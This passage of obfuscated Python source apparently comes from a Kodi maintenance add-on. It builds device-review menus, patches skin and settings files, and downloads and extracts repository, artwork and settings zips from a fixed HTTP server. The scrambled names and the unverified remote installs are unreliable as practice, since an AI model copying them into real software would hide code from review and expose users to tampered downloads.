 iIi1iIi11ii = iI1IIi [ 0 ] if ( len ( iI1IIi ) > 0 ) else ''
 IiI111I = II11oo0o0O [ 0 ] if ( len ( II11oo0o0O ) > 0 ) else ''
 oo0oO0 = ooo0ooooo0o [ 0 ] if ( len ( ooo0ooooo0o ) > 0 ) else ''
 ii1i1Iii = IIIII [ 0 ] if ( len ( IIIII ) > 0 ) else ''
 IIII11111Ii = Ii1IIi1I11i [ 0 ] if ( len ( Ii1IIi1I11i ) > 0 ) else ''
 IiiiII = O0o0oOooOoo [ 0 ] if ( len ( O0o0oOooOoo ) > 0 ) else ''
 OoOoo00Oo0OoO = oOo0O0 [ 0 ] if ( len ( oOo0O0 ) > 0 ) else ''
 o0o0 = iIi1iI [ 0 ] if ( len ( iIi1iI ) > 0 ) else ''
 oOOOOOooo = iIIII1iII1i [ 0 ] if ( len ( iIIII1iII1i ) > 0 ) else ''
 IIII = O0OO00OoO00 [ 0 ] if ( len ( O0OO00OoO00 ) > 0 ) else ''
 o0o0OOo0OOoO = O00o [ 0 ] if ( len ( O00o ) > 0 ) else ''
 O0ooO = Ii11Iiii1iiii [ 0 ] if ( len ( Ii11Iiii1iiii ) > 0 ) else ''
 i1Ii1IiiIi1II = i1IIII1111 [ 0 ] if ( len ( i1IIII1111 ) > 0 ) else ''
 o0oOoOooOOo = Ooo0o0000OO [ 0 ] if ( len ( Ooo0o0000OO ) > 0 ) else ''
 iIIII1iIIii = OOoOO0ooo [ 0 ] if ( len ( OOoOO0ooo ) > 0 ) else ''
 I1Ii11I11i1 = iIiI1II1I1 [ 0 ] if ( len ( iIiI1II1I1 ) > 0 ) else ''
 IiII1 = OooiIiI1i1Ii [ 0 ] if ( len ( OooiIiI1i1Ii ) > 0 ) else 'None'
 iI1I1I = Oo0o00o [ 0 ] if ( len ( Oo0o00o ) > 0 ) else 'None'
 ii11III = O0oO00oOOooO [ 0 ] if ( len ( O0oO00oOOooO ) > 0 ) else ''
 Oo0o0oOo0oO = III1I1 [ 0 ] if ( len ( III1I1 ) > 0 ) else ''
 i1iiiI1I = iI1IIIIII [ 0 ] if ( len ( iI1IIIIII ) > 0 ) else ''
 o00OoOOoO = OO0oO0Oo [ 0 ] if ( len ( OO0oO0Oo ) > 0 ) else ''
 iii1i1Iiiiiii = OoooOO0 [ 0 ] if ( len ( OoooOO0 ) > 0 ) else ''
 OOoo0 = oo0OoO [ 0 ] if ( len ( oo0OoO ) > 0 ) else ''
 Ii11I1iIIi = iIIi1iii1 [ 0 ] if ( len ( iIIi1iii1 ) > 0 ) else ''
 O0ooOiI = o00o0 [ 0 ] if ( len ( o00o0 ) > 0 ) else ''
 OOI1III1I11I1 = OOoOo0O0 [ 0 ] if ( len ( OOoOo0O0 ) > 0 ) else ''
 i11I1IiiiiiiiIi = I1o0 [ 0 ] if ( len ( I1o0 ) > 0 ) else ''
 oO000OoO00OoO = I1IiiiiI1i1I [ 0 ] if ( len ( I1IiiiiI1i1I ) > 0 ) else ''
 I1IiIi1iiI = I11i1I1 [ 0 ] if ( len ( I11i1I1 ) > 0 ) else ''
 iiII1II11i = ooOooO [ 0 ] if ( len ( ooOooO ) > 0 ) else ''
 ooO0OoooooOo0oOo0 = oooo [ 0 ] if ( len ( oooo ) > 0 ) else ''
 II11II = IIIiI1iIIII [ 0 ] if ( len ( IIIiI1iIIII ) > 0 ) else ''
 i1ii11 = o0oo00OOOo [ 0 ] if ( len ( o0oo00OOOo ) > 0 ) else ''
 IIIo00O = oo0oO [ 0 ] if ( len ( oo0oO ) > 0 ) else ''
 ii1I1I1 = i1i1IIi [ 0 ] if ( len ( i1i1IIi ) > 0 ) else ''
 oo0oOOO0oOoo = o0oo0Ooo0 [ 0 ] if ( len ( o0oo0Ooo0 ) > 0 ) else ''
 Ii1o0OOOoo0000 = o0OOoO [ 0 ] if ( len ( o0OOoO ) > 0 ) else ''
 IiIIii1i1i11iII = I1iII1II1I1ii [ 0 ] if ( len ( I1iII1II1I1ii ) > 0 ) else ''
 o0II1 = oo0OO0O [ 0 ] if ( len ( oo0OO0O ) > 0 ) else ''
 OOOiiIII1I11iii = OO0OooOOoO00OO00 [ 0 ] if ( len ( OO0OooOOoO00OO00 ) > 0 ) else ''
 ooIii = ii11ii1iIiI1 [ 0 ] if ( len ( ii11ii1iIiI1 ) > 0 ) else ''
 o0OO00oOOO0o0 = OoOo0oO0 [ 0 ] if ( len ( OoOo0oO0 ) > 0 ) else 'None'
 iiii = i111iIi1i1 [ 0 ] if ( len ( i111iIi1i1 ) > 0 ) else ''
 oOOOOOoOOoo0 = str ( '[COLOR=dodgerblue]Added: [/COLOR]' + o0oOoOooOOo + '[CR][COLOR=dodgerblue]Manufacturer: [/COLOR]' + IIIiii11 + '[CR][COLOR=dodgerblue]Supported Roms: [/COLOR]' + iIIII1iIIii + '[CR][COLOR=dodgerblue]Chipset: [/COLOR]' + I1Ii11I11i1 + '[CR][COLOR=dodgerblue]CPU: [/COLOR]' + i1iiiI1I + '[CR][COLOR=dodgerblue]GPU: [/COLOR]' + o00OoOOoO + '[CR][COLOR=dodgerblue]RAM: [/COLOR]' + iii1i1Iiiiiii + '[CR][COLOR=dodgerblue]Flash: [/COLOR]' + OOoo0 + '[CR][COLOR=dodgerblue]Wi-Fi: [/COLOR]' + Ii11I1iIIi + '[CR][COLOR=dodgerblue]Bluetooth: [/COLOR]' + O0ooOiI + '[CR][COLOR=dodgerblue]LAN: [/COLOR]' + OOI1III1I11I1 + '[CR][CR][COLOR=yellow]About: [/COLOR]' + i1i1IIii1i1 + '[CR][CR][COLOR=yellow]Summary:[/COLOR][CR][CR][COLOR=dodgerblue]Pros:[/COLOR]    ' + oO000OoO00OoO + '[CR][CR][COLOR=dodgerblue]Cons:[/COLOR]  ' + I1IiIi1iiI + '[CR][CR][COLOR=yellow]Benchmark Results:[/COLOR][CR][CR][COLOR=dodgerblue]Boot Time:[/COLOR][CR]' + oo0oOOO0oOoo + '[CR][CR][COLOR=dodgerblue]Time taken to scan 1,000 movies (local NFO files):[/COLOR][CR]' + iiII1II11i + '[CR][CR][COLOR=dodgerblue]Copy 4,000 files (660.8MB) locally:[/COLOR][CR]' + Ii1o0OOOoo0000 + '[CR][CR][COLOR=dodgerblue]Copy a MP4 file (339.4MB) locally:[/COLOR][CR]' + IiIIii1i1i11iII + '[CR][CR][COLOR=dodgerblue]Ethernet Speed - Copy MP4 (339.4MB) from SMB share to device:[/COLOR][CR]' + o0II1 + '[CR][CR][COLOR=dodgerblue]4k Playback:[/COLOR][CR]' + ooO0OoooooOo0oOo0 + '[CR][CR][COLOR=dodgerblue]1080p Playback:[/COLOR][CR]' + II11II + '[CR][CR][COLOR=dodgerblue]720p Playback:[/COLOR][CR]' + i1ii11 + '[CR][CR][COLOR=dodgerblue]Audio Playback:[/COLOR][CR]' + ii1I1I1 + '[CR][CR][COLOR=dodgerblue]Image Slideshow:[/COLOR][CR]' + OOOiiIII1I11iii )
 oo0OOO0OOoOO = str ( '[COLOR=dodgerblue]Added: [/COLOR]' + o0oOoOooOOo + '[CR][COLOR=dodgerblue]Manufacturer: [/COLOR]' + IIIiii11 + '[CR][COLOR=dodgerblue]Supported Roms: [/COLOR]' + iIIII1iIIii + '[CR][COLOR=dodgerblue]Chipset: [/COLOR]' + I1Ii11I11i1 + '[CR][COLOR=dodgerblue]CPU: [/COLOR]' + i1iiiI1I + '[CR][COLOR=dodgerblue]GPU: [/COLOR]' + o00OoOOoO + '[CR][COLOR=dodgerblue]RAM: [/COLOR]' + iii1i1Iiiiiii + '[CR][COLOR=dodgerblue]Flash: [/COLOR]' + OOoo0 + '[CR][COLOR=dodgerblue]Wi-Fi: [/COLOR]' + Ii11I1iIIi + '[CR][COLOR=dodgerblue]Bluetooth: [/COLOR]' + O0ooOiI + '[CR][COLOR=dodgerblue]LAN: [/COLOR]' + OOI1III1I11I1 + '[CR][CR][COLOR=yellow]About: [/COLOR]' + i1i1IIii1i1 + '[CR][CR][COLOR=yellow]Summary:[/COLOR][CR][CR][COLOR=dodgerblue]Pros:[/COLOR]    ' + oO000OoO00OoO + '[CR][CR][COLOR=dodgerblue]Cons:[/COLOR]  ' + I1IiIi1iiI + '[CR][CR][COLOR=orange]4k Playback:[/COLOR]  ' + ooO0OoooooOo0oOo0 + '[CR][CR][COLOR=orange]1080p Playback:[/COLOR]  ' + II11II + '[CR][CR][COLOR=orange]720p Playback:[/COLOR]  ' + i1ii11 + '[CR][CR][COLOR=orange]DTS Compatibility:[/COLOR]  ' + ii1I1I1 + '[CR][CR][COLOR=orange]Time taken to scan 100 movies:[/COLOR]  ' + iiII1II11i )
 if 97 - 97: i1IIi
 if i1i1IIii1i1 != '' and iI11ii != '' :
  iIiIIi1 ( '' , '[COLOR=yellow][Text Guide][/COLOR]  Official Description' , oOOOOOoOOoo0 , 'text_guide' , 'Tutorials.png' , Oo00OOOOO , '' , '' )
 if i1i1IIii1i1 != '' and iI11ii == '' :
  iIiIIi1 ( '' , '[COLOR=yellow][Text Guide][/COLOR]  Official Description' , oo0OOO0OOoOO , 'text_guide' , 'Tutorials.png' , Oo00OOOOO , '' , '' )
 if o0OO00oOOO0o0 != 'None' :
  iIiIIi1 ( '' , '[COLOR=lime][VIDEO][/COLOR]   Benchmark Review' , o0OO00oOOO0o0 , 'play_video' , 'Video_Guide.png' , Oo00OOOOO , '' , '' )
 if iI1I1I != 'None' :
  iIiIIi1 ( '' , '[COLOR=lime][VIDEO][/COLOR]   Official Video Preview' , iI1I1I , 'play_video' , 'Video_Guide.png' , Oo00OOOOO , '' , '' )
 if IiII1 != 'None' :
  iIiIIi1 ( '' , '[COLOR=lime][VIDEO][/COLOR]   Official Video Guide' , IiII1 , 'play_video' , 'Video_Guide.png' , Oo00OOOOO , '' , '' )
 if O00oO0 != 'None' :
  iIiIIi1 ( '' , '[COLOR=lime][VIDEO][/COLOR]  ' + Iii , O00oO0 , 'play_video' , 'Video_Guide.png' , Oo00OOOOO , '' , '' )
 if O0Oo00OoOo != 'None' :
  iIiIIi1 ( '' , '[COLOR=lime][VIDEO][/COLOR]  ' + I1iiiiI1iI , O0Oo00OoOo , 'play_video' , 'Video_Guide.png' , Oo00OOOOO , '' , '' )
 if ii1ii111 != 'None' :
  iIiIIi1 ( '' , '[COLOR=lime][VIDEO][/COLOR]  ' + iIiiiii1i , ii1ii111 , 'play_video' , 'Video_Guide.png' , Oo00OOOOO , '' , '' )
 if i11111I1I != 'None' :
  iIiIIi1 ( '' , '[COLOR=lime][VIDEO][/COLOR]  ' + iiIi1IIiI , i11111I1I , 'play_video' , 'Video_Guide.png' , Oo00OOOOO , '' , '' )
 if ii1Oo0000oOo != 'None' :
  iIiIIi1 ( '' , '[COLOR=lime][VIDEO][/COLOR]  ' + i1oO0OO0 , ii1Oo0000oOo , 'play_video' , 'Video_Guide.png' , Oo00OOOOO , '' , '' )
  if 46 - 46: I1ii11iIi11i
  if 30 - 30: OoO0O00 / O0 * o0oOOo0O0Ooo * iI1iiIiiII + OoooooooOO * oo0oooooO0
def iIIi1I1Ii1 ( ) :
 iIiIIi1 ( 'folder' , '[COLOR=yellow]Manual Search[/COLOR]' , 'hardware' , 'manual_search' , 'Manual_Search.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=lime]All Devices[/COLOR]' , '' , 'grab_hardware' , 'All.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=orange][Hardware][/COLOR] Game Consoles' , 'device=Console' , 'grab_hardware' , 'Consoles.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=orange][Hardware][/COLOR] HTPC' , 'device=HTPC' , 'grab_hardware' , 'HTPC.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=orange][Hardware][/COLOR] Phones' , 'device=Phone' , 'grab_hardware' , 'Phones.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=orange][Hardware][/COLOR] Set Top Boxes' , 'device=STB' , 'grab_hardware' , 'STB.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=orange][Hardware][/COLOR] Tablets' , 'device=Tablet' , 'grab_hardware' , 'Tablets.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=dodgerblue][Accessories][/COLOR] Remotes/Keyboards' , 'device=Remote' , 'grab_hardware' , 'Remotes.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=dodgerblue][Accessories][/COLOR] Gaming Controllers' , 'device=Controller' , 'grab_hardware' , 'Controllers.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=dodgerblue][Accessories][/COLOR] Dongles' , 'device=Dongle' , 'grab_hardware' , 'Dongles.png' , '' , '' , '' )
 if 54 - 54: OoooooooOO . ooOo - oo0oooooO0
 if 76 - 76: iI1iiIiiII
def O00o0 ( url ) :
 iIiIIi1 ( 'folder' , '[COLOR=yellow][CPU][/COLOR] Allwinner Devices' , str ( url ) + '&chip=Allwinner' , 'grab_hardware' , 'Allwinner.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=yellow][CPU][/COLOR] AMLogic Devices' , str ( url ) + '&chip=AMLogic' , 'grab_hardware' , 'AMLogic.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=yellow][CPU][/COLOR] Intel Devices' , str ( url ) + '&chip=Intel' , 'grab_hardware' , 'Intel.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=yellow][CPU][/COLOR] Rockchip Devices' , str ( url ) + '&chip=Rockchip' , 'grab_hardware' , 'Rockchip.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=lime][Platform][/COLOR] Android' , str ( url ) + '&platform=Android' , 'grab_hardware' , 'Android.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=lime][Platform][/COLOR] iOS' , str ( url ) + '&platform=iOS' , 'grab_hardware' , 'iOS.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=lime][Platform][/COLOR] Linux' , str ( url ) + '&platform=Linux' , 'grab_hardware' , 'Linux.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=lime][Platform][/COLOR] OpenELEC' , str ( url ) + '&platform=OpenELEC' , 'grab_hardware' , 'OpenELEC.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=lime][Platform][/COLOR] OSX' , str ( url ) + '&platform=OSX' , 'grab_hardware' , 'OSX.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=lime][Platform][/COLOR] Pure Linux' , str ( url ) + '&platform=Custom_Linux' , 'grab_hardware' , 'Custom_Linux.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=lime][Platform][/COLOR] Windows' , str ( url ) + '&platform=Windows' , 'grab_hardware' , 'Windows.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=orange][Flash Storage][/COLOR] 4GB' , str ( url ) + '&flash=4GB' , 'grab_hardware' , 'Flash.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=orange][Flash Storage][/COLOR] 8GB' , str ( url ) + '&flash=8GB' , 'grab_hardware' , 'Flash.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=orange][Flash Storage][/COLOR] 16GB' , str ( url ) + '&flash=16GB' , 'grab_hardware' , 'Flash.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=orange][Flash Storage][/COLOR] 32GB' , str ( url ) + '&flash=32GB' , 'grab_hardware' , 'Flash.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=orange][Flash Storage][/COLOR] 64GB' , str ( url ) + '&flash=64GB' , 'grab_hardware' , 'Flash.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=dodgerblue][RAM][/COLOR] 1GB' , str ( url ) + '&ram=1GB' , 'grab_hardware' , 'RAM.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=dodgerblue][RAM][/COLOR] 2GB' , str ( url ) + '&ram=2GB' , 'grab_hardware' , 'RAM.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=dodgerblue][RAM][/COLOR] 4GB' , str ( url ) + '&ram=4GB' , 'grab_hardware' , 'RAM.png' , '' , '' , '' )
 if 98 - 98: iIii1I11I1II1 + i11iIiiIii * I1ii11iIi11i / iI1iiIiiII / OOo00O0 - O0
 if 42 - 42: oo0oooooO0
 if 77 - 77: i1IIi * ooOo % OoooooooOO + O0 * OOo00O0
def I11i1iiiiIIIi ( ) :
 oOOoo0Oo = xbmc . getSkinDir ( )
 iI1i1IiIIIIi = xbmc . translatePath ( os . path . join ( Ooo , oOOoo0Oo ) )
 if 13 - 13: O0 + iI1iiIiiII * II111iiii + Oo0Ooo * oOoO0o00OO0
 for IIIIiI11Ii1i , iIIIIiiIii , ooO0oo in os . walk ( iI1i1IiIIIIi ) :
  if 12 - 12: oOoO0o00OO0 - OO0oo0oOO % OO0oo0oOO
  for ooOo0O0o0 in ooO0oo :
   if 23 - 23: OOo00O0
   if 'DialogKeyboard.xml' in ooOo0O0o0 :
    oOOoo0Oo = os . path . join ( IIIIiI11Ii1i , ooOo0O0o0 )
    ooo0O0o0OoOO = open ( oOOoo0Oo ) . read ( )
    iIi11i = ooo0O0o0OoOO . replace ( '<control type="label" id="310"' , '<control type="edit" id="312"' )
    ooOo0O0o0 = open ( oOOoo0Oo , mode = 'w' )
    ooOo0O0o0 . write ( iIi11i )
    ooOo0O0o0 . close ( )
    IiiIiI1I1 ( oOOoo0Oo )
    if 61 - 61: oOoO0o00OO0 + oo0oooooO0 - OoO0O00 * ooOo
    for ii11Ii1IiiI1 in range ( 48 , 58 ) :
     Ii1IIIII ( ii11Ii1IiiI1 , oOOoo0Oo )
     if 87 - 87: II111iiii % II111iiii
 O0OoO000O0OO = xbmcgui . Dialog ( )
 O0OoO000O0OO . ok ( "Skin Changes Successful" , 'A BIG thank you to Mikey1234 for this fix. The code used for this function was ported from the Xunity Maintenance add-on' )
 xbmc . executebuiltin ( 'ReloadSkin()' )
 if 51 - 51: OOo00O0 * iIii1I11I1II1 . oo0oooooO0
def iIi11I1II ( ) :
 O0OoO000O0OO = xbmcgui . Dialog ( )
 IiiIiI1IIi1IIIii = xbmcgui . Dialog ( ) . yesno ( 'Convert This Skin To Kodi (Helix)?' , 'This will fix the problem with a blank on-screen keyboard showing in skins designed for Gotham (being run on Kodi). This will only affect the currently running skin.' , nolabel = 'No, Cancel' , yeslabel = 'Yes, Fix' )
 if 93 - 93: I1ii11iIi11i - OOo00O0 % I1ii11iIi11i
 if IiiIiI1IIi1IIIii == 1 :
  I11i1iiiiIIIi ( )
  if 12 - 12: Oo + OoO0O00 * iii1I11ii1i1 + OO0oo0oOO + oOoO0o00OO0
  if 58 - 58: oo0oooooO0 * OO0oo0oOO - i11iIiiIii % I1ii11iIi11i
def I11O0O0o ( ) :
 if O0OoO000O0OO . yesno ( "Hide Passwords" , "This will hide all your passwords in your" , "add-on settings, are you sure you wish to continue?" ) :
  for IIIIiI11Ii1i , iIIIIiiIii , ooO0oo in os . walk ( Ooo ) :
   for ooOo0O0o0 in ooO0oo :
    if ooOo0O0o0 == 'settings.xml' :
     i1i1i1I = open ( os . path . join ( IIIIiI11Ii1i , ooOo0O0o0 ) ) . read ( )
     i11111I1IOoo0ooOOOOoOo = re . compile ( '<setting id=(.+?)>' ) . findall ( i1i1i1I )
     for i111II in i11111I1IOoo0ooOOOOoOo :
      if 'pass' in i111II :
       if not 'option="hidden"' in i111II :
        try :
         O0o0 = i111II . replace ( '/' , ' option="hidden"/' )
         ooOo0O0o0 = open ( os . path . join ( IIIIiI11Ii1i , ooOo0O0o0 ) , mode = 'w' )
         ooOo0O0o0 . write ( str ( i1i1i1I ) . replace ( i111II , O0o0 ) )
         ooOo0O0o0 . close ( )
        except :
         pass
  O0OoO000O0OO . ok ( "Passwords Hidden" , "Your passwords will now show as stars (hidden), if you want to undo this please use the option to unhide passwords." )
  if 64 - 64: OoooooooOO + Oo0Ooo
  if 27 - 27: oo0oooooO0 + OO0oo0oOO * I1IiiI * I1ii11iIi11i . iI1iiIiiII
def OOO0ooO0Oo0 ( url ) :
 iIII1I111III = 'http://noobsandnerds.com/IT/Community_Builds/guisettings.php?id=%s' % ( url )
 IIo0o0O0O00oOOo = iIIIiIi ( iIII1I111III ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 o0O0Ooo = re . compile ( 'guisettings="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 ii111iiIii = o0O0Ooo [ 0 ] if ( len ( o0O0Ooo ) > 0 ) else 'None'
 if 54 - 54: iIii1I11I1II1 * oo0oooooO0 * oOoO0o00OO0
 iii11i1i1 ( ii111iiIii , I1i1iI11ii )
 if 65 - 65: i1IIi . i11iIiiIii
 if 62 - 62: I1ii11iIi11i + OoO0O00 - I1ii11iIi11i * oOoO0o00OO0 - iii1I11ii1i1 * iii1I11ii1i1
def OO00o ( path ) :
 I11I11 = xbmc . translatePath ( os . path . join ( ooOoOoo0O , 'background_art' , '' ) )
 if 51 - 51: oo0oooooO0 / iii1I11ii1i1 - iii1I11ii1i1
 if os . path . exists ( I11I11 ) :
  O0ooO00o ( I11I11 )
  if 65 - 65: OoOoOO00 * O0 - OoOoOO00 - OoO0O00
 time . sleep ( 1 )
 if 96 - 96: I1ii11iIi11i - O0
 if not os . path . exists ( I11I11 ) :
  os . makedirs ( I11I11 )
  if 35 - 35: Oo . iii1I11ii1i1 . iI1iiIiiII - iii1I11ii1i1 % iii1I11ii1i1 + iI1iiIiiII
 try :
  iiI1IiI . create ( "Installing Artwork" , "Downloading artwork pack" , '' , 'Please Wait' )
  o0OO0oooo = os . path . join ( iIo00O , I1IiiI + '_artpack.zip' )
  downloader . download ( path , o0OO0oooo , iiI1IiI )
  time . sleep ( 1 )
  iiI1IiI . create ( "[COLOR=blue][B]T[/COLOR][COLOR=dodgerblue]R[/COLOR] [COLOR=white]Community Builds[/COLOR][/B]" , "Checking " , '' , 'Please Wait' )
  iiI1IiI . update ( 0 , "" , "Extracting Zip Please Wait" )
  O0OoOoO00O ( o0OO0oooo , I11I11 , iiI1IiI )
  if 99 - 99: o0oOOo0O0Ooo + Oo
 except :
  pass
  if 34 - 34: iI1iiIiiII * o0oOOo0O0Ooo . I1IiiI % i11iIiiIii
  if 61 - 61: iIii1I11I1II1 + ooOo * iii1I11ii1i1 - i1IIi % ooOo
def oOOo ( url ) :
 iIiIIi1 ( '' , '[COLOR=orange]noobs[/COLOR][COLOR=dodgerblue]and[/COLOR][COLOR=orange]nerds[/COLOR] Keyword Install' , O00O0oOO00O00 , 'keywords' , 'Keywords.png' , '' , '' , '' )
 if i1 == 'true' :
  iIiIIi1 ( 'folder' , 'Manage Add-ons' , oooooOoo0ooo , 'addonmenu' , 'Search_Addons.png' , '' , '' , '' )
  if 9 - 9: iI1iiIiiII - OoO0O00 + iIii1I11I1II1 % O0 + iii1I11ii1i1 + oOoO0o00OO0
 if oOOoo00O0O == 'true' :
  iIiIIi1 ( 'folder' , 'Community Builds' , url , 'community' , 'Community_Builds.png' , '' , '' , '' )
  if 50 - 50: i1IIi + OOo00O0
  if 64 - 64: o0oOOo0O0Ooo % ooOo . OOo00O0
def i1Ii ( ) :
 xbmc . executebuiltin ( 'ActivateWindow(10040,"addons://install/",return)' )
 if 39 - 39: iI1iiIiiII
 if 57 - 57: OoooooooOO * OoooooooOO - I1IiiI / iI1iiIiiII * I1ii11iIi11i - oOoO0o00OO0
def IIIIIii1ii11 ( repo_id ) :
 oo000oOo0 = 1
 iIII1I111III = 'http://noobsandnerds.com/TI/AddonPortal/dependencyinstall.php?id=%s' % ( repo_id )
 IIo0o0O0O00oOOo = iIIIiIi ( iIII1I111III ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 I1i1i1iii = re . compile ( 'name="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 ii1iii1i = re . compile ( 'version="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 o0oooOO00 = re . compile ( 'repo_url="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 iiIiii1IIIII = re . compile ( 'data_url="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 o00o = re . compile ( 'zip_url="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 oo00o0 = re . compile ( 'repo_id="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 Oo0o = I1i1i1iii [ 0 ] if ( len ( I1i1i1iii ) > 0 ) else ''
 Oo0 = ii1iii1i [ 0 ] if ( len ( ii1iii1i ) > 0 ) else ''
 iIi = o0oooOO00 [ 0 ] if ( len ( o0oooOO00 ) > 0 ) else ''
 ii1iI1i = iiIiii1IIIII [ 0 ] if ( len ( iiIiii1IIIII ) > 0 ) else ''
 i1iiiI = o00o [ 0 ] if ( len ( o00o ) > 0 ) else ''
 OoOoO00o00 = oo00o0 [ 0 ] if ( len ( oo00o0 ) > 0 ) else ''
 I11iiIiI1II11 = xbmc . translatePath ( os . path . join ( OOO00O , OoOoO00o00 + '.zip' ) )
 OOOoOOOo = xbmc . translatePath ( os . path . join ( Ooo , OoOoO00o00 ) )
 if 82 - 82: Oo0Ooo + iI1iiIiiII
 iiI1IiI . create ( 'Installing Repository' , 'Please wait...' , '' )
 if 93 - 93: iii1I11ii1i1 * O0 * Oo - o0oOOo0O0Ooo / I1ii11iIi11i
 try :
  downloader . download ( iIi , I11iiIiI1II11 , iiI1IiI )
  O0OoOoO00O ( I11iiIiI1II11 , Ooo , iiI1IiI )
  xbmc . executebuiltin ( 'UpdateLocalAddons' )
  xbmc . executebuiltin ( 'UpdateAddonRepos' )
  if 54 - 54: i1IIi - OoO0O00 / OoooooooOO
 except :
  if 95 - 95: O0 + iIii1I11I1II1 . I1ii11iIi11i
  try :
   downloader . download ( i1iiiI , I11iiIiI1II11 , iiI1IiI )
   O0OoOoO00O ( I11iiIiI1II11 , Ooo , iiI1IiI )
   xbmc . executebuiltin ( 'UpdateLocalAddons' )
   xbmc . executebuiltin ( 'UpdateAddonRepos' )
   if 61 - 61: OO0oo0oOO * OO0oo0oOO
  except :
   if 70 - 70: iI1iiIiiII . I1ii11iIi11i / o0oOOo0O0Ooo * ooOo
   try :
    if 74 - 74: I1IiiI . OOo00O0 / oo0oooooO0 . oOoO0o00OO0
    if not os . path . exists ( OOOoOOOo ) :
     os . makedirs ( OOOoOOOo )
     if 74 - 74: Oo0Ooo / iI1iiIiiII % iI1iiIiiII . oOoO0o00OO0
    IIo0o0O0O00oOOo = iIIIiIi ( ii1iI1i ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
    i11111I1IOoo0ooOOOOoOo = re . compile ( 'href="(.+?)"' , re . DOTALL ) . findall ( IIo0o0O0O00oOOo )
    if 72 - 72: i1IIi
    for IiiiI in i11111I1IOoo0ooOOOOoOo :
     Iiii1I1 = xbmc . translatePath ( os . path . join ( OOOoOOOo , IiiiI ) )
     if 21 - 21: iI1iiIiiII . Oo / i11iIiiIii * i1IIi
     if OO0O0Ooo not in IiiiI and '/' not in IiiiI :
      if 82 - 82: OOo00O0 * Oo0Ooo % i11iIiiIii * i1IIi . Oo
      try :
       iiI1IiI . update ( 0 , "Downloading [COLOR=yellow]" + IiiiI + '[/COLOR]' , '' , 'Please wait...' )
       downloader . download ( ii1iI1i + IiiiI , Iiii1I1 , iiI1IiI )
       if 89 - 89: oOoO0o00OO0 - i1IIi - oOoO0o00OO0
      except : print "failed to install" + IiiiI
      if 74 - 74: OoO0O00 % OoO0O00
     if '/' in IiiiI and '..' not in IiiiI and 'http' not in IiiiI :
      O0O00oOooo0OO = ii1iI1i + IiiiI
      iIIi1I ( Iiii1I1 , O0O00oOooo0OO )
      if 28 - 28: OoOoOO00 % ooOo - Oo + Oo + ooOo / iIii1I11I1II1
   except :
    O0OoO000O0OO . ok ( "Error downloading repository" , 'There was an error downloading[CR][COLOR=dodgerblue]' + Oo0o + '[/COLOR]. Please consider updating the add-on portal with details or report the error on the forum at [COLOR=orange]www.noobs[/COLOR][COLOR=dodgerblue]and[/COLOR][COLOR=orange]nerds.com[/COLOR]' )
    oo000oOo0 = 0
    if 91 - 91: I1IiiI / II111iiii * Oo
    if 94 - 94: II111iiii - iIii1I11I1II1 - iIii1I11I1II1
 if oo000oOo0 == 1 :
  time . sleep ( 1 )
  iiI1IiI . update ( 0 , "[COLOR=yellow]" + Oo0o + '[/COLOR]  [COLOR=lime]Successfully Installed[/COLOR]' , '' , 'Now installing dependencies' )
  time . sleep ( 1 )
  iiii1I1 = 'http://noobsandnerds.com/TI/AddonPortal/downloadcount.php?id=%s' % ( repo_id )
  iIIIiIi ( iiii1I1 )
  if 83 - 83: I1ii11iIi11i * iIii1I11I1II1 + OoOoOO00 * i1IIi . OoooooooOO % OO0oo0oOO
  if 81 - 81: OoO0O00 - iIii1I11I1II1
def o0oooO0O00OoO ( ) :
 iIiIIi1 ( '' , '[COLOR=dodgerblue][TEXT GUIDE][/COLOR]  What is Community Builds?' , 'url' , 'instructions_3' , 'How_To.png' , '' , '' , '' )
 iIiIIi1 ( '' , '[COLOR=dodgerblue][TEXT GUIDE][/COLOR]  Creating a Community Build' , 'url' , 'instructions_1' , 'How_To.png' , '' , '' , '' )
 iIiIIi1 ( '' , '[COLOR=dodgerblue][TEXT GUIDE][/COLOR]  Installing a Community Build' , 'url' , 'instructions_2' , 'How_To.png' , '' , '' , '' )
